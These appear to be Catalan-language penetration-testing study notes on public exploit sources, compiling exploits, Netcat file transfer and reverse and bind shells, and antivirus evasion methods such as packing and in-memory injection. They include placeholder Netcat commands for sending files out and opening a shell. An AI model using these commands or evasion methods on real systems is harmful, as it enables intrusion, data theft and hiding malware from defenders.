## Public exploits
Hi ha una gran col·lecció de proves de concepte (PoC) i exploits a Internet. Tanmateix, és important verificar el codi que contenen i comprovar que no hi ha cap backdoor (no intencionat) o altres tipus de malware que ens puguin comprometre. Les principals fonts fiables d'exploits són:
- [Rapid7](https://www.rapid7.com/db/)
- [GitHub](https://github.com/)
- [Exploit-DB](https://www.exploit-db.com/)
També és recomanable anar mirant de tant en tant [Packet Storm](https://packetstorm.news/), un lloc web on es van pujant actualitzacions de vulnerabilitats que es descobreixen i altres notícies relacionades amb aquestes.
##### Fixing exploits
Molts exploits tenen integrats la IP i el port local, o un payload de prova específic que no serveix més enllà que per detectar si el sistema és vulnerable. Per tant, al revisar el codi també s'ha de revisar això i, si s'escau, canviar-ho. 
D'altra banda, depenent del sistema operatiu al qual vulguem executar l'exploit, si està escrit en C, C++, C#... s'ha de tenir en compte que s'ha de compilar, i no és el mateix format per Windows que per Linux. Si no hi ha instruccions de compilació es pot fer de la forma següent:
##### Windows
Amb MinGW-w64 i Wine:
```bash
i686-w64-mingw32-gcc [file] -o [output] # -lws2_32 si el SO és x86
```
##### Linux
```bash
gcc [file] -o [output]
```
> El repositori fet per OffSec [Exploitdb-Bin-Sploits](https://github.com/offensive-security/exploitdb-bin-sploits) és una font fiable d'exploits precompilats.

## Netcat
Netcat és una eina de gestió de connexions de xarxa, tant TCP com UDP. Té moltíssims usos però en l'àmbit del pentesting s'utilitza sobretot per establir consoles interactives entre la màquina víctima i el host atacant i per transferir informació entre aquests. 
Té dos modes:
- **Listener:** obre un port per esperar una connexió.
- **Reciever:** estableix una connexió.
```bash
#File transfer
nc -lvnp [port] > [output_file] # Rebre arxiu
nc -nv [ip] [port] < [input_file] # Enviar arxiu
```
##### Reverse shells
L'atacant es posa en escolta per un port determinat i el host víctima inicia una consola interactiva a la IP atacant. És la forma més comuna d'aconseguir una consola interactiva, tot i que mostri l'adreça de l'atacant.
```bash
nc -lvnp [port] # Atacant en escolta
```
Cada terminal i servei té la seva forma d'entaular una consola interactiva. A la web [RevShells](https://revshells.com) es poden consultar i modificar segons les necessitats.
##### Bind shells
Una bind shell és el procés contrari que la reverse shell però amb el mateix resultat. En aquest cas, és el host víctima el que es posa en escolta en un port determinat per a que l'atacant pugui connectar-se i executar una consola. No es gaire comuna, ja que els sistemes solen tenir per defecte un firewall activat que bloqueja les connexions entrants, sobretot a Windows.
```bash
nc [ip] [port] -e [terminal] # Connectar-se a la màquina víctima
```

## Obfuscation
Molts cops els hosts objectiu estaran protegits per un antivirus que identificara els exploits com a maliciosos i impedirà que s'executin. Els mètodes de detecció dels antivirus es classifiquen en:
- **Signatura:** es compara una seqüència de bytes associada a l'arxiu o les seves connexions amb la base de dades de signatures de programa maliciós de l'antivirus.
- **Heurística:** anàlisi del codi i detecció de patrons maliciosos en comparació amb patrons coneguts d'altre malware.
- **Comportament:** monitorització de l'activitat d'un programa i detecció de connexions o execucions malicioses.
I hi ha tècniques que permeten dificultar la detecció, o fins i tot evadir-la, que es separen en:

**Evasió on-disk**
- Ofuscació: reorganitzar i randomitzar el codi per dificultar el seu anàlisis.
- Codificació: reformatejar el codi en un altre format (hex, base64...)
- Packing: generar un executable diferent a l'original per canviar-li la signatura
- Encriptació: encriptar el exploit i executar-lo juntament amb la clau de desencriptació mitjançant un stub.

**Evasió in-memory**
S'injecta el exploit en la memòria, sense crear cap arxiu i, per tant, costa més de detectar. Normalment s'injecta en un procés legítim amb un thread separat.

Les eines principals que s'utilitzen per aquest propòsit són [shellter](https://github.com/ParrotSec/shellter), [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) i [Ebowla](https://github.com/Genetic-Malware/Ebowla), tot i que n'hi ha moltes més.